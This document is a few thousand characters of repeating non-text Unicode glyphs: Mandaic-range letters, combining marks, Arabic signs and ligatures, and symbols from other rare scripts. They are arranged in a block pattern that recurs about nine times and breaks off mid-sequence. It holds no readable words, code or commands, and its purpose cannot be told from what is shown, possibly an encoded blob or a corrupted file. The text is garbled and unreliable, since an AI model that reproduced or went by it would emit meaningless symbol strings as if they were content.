࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛𞋬𞋬𞋬𞋬𞋬